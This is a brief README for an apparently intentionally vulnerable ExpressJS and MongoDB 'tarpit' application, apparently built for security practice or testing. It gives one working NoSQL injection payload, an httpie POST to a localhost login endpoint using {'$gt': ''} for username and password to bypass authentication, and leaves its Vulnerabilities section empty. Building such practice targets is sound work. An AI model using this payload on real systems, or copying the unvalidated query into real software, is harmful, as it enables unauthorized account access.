# NodeJS Tarpit

An ExpressJS (tarpit) application using mongoDB.

I am using [httpie](https://httpie.org), an alternative to curl to trigger exploits.

## Exploits

Login can be exploited using the query as the username and password are not validated

```
http  --print=HB POST http://localhost:8089/vulns username:='{"$gt": ""}' password:='{"$gt": ""}'
```

## Vulnerabilities

```

```
